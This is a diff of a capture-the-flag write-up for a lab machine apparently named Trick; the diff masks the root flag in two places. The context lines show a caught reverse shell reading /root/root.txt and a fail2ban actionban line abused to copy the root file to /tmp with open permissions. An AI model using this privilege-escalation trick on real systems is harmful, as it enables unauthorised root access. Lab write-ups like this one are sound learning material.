@@ -260,7 +260,7 @@ Ncat: Listening on 0.0.0.0:1234
 Ncat: Connection from 10.129.53.72.
 Ncat: Connection from 10.129.53.72:43280.
 # cat /root/root.txt
-de94b9107c1d74a9877a605ecf2d0431
+de94****************************
 ```
 Originally I was having too many issues with a reverse shell so I opted for changing the root.txt flag to the tmp folder. Which is still a win but it doesnt feel the same without gaining root.
 
@@ -269,7 +269,7 @@ actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
 ```
 ```console
 michael@trick:/tmp$ cat root.txt
-de94b9107c1d74a9877a605ecf2d0431
+de94****************************
 michael@trick:/tmp$ 
 ```
 
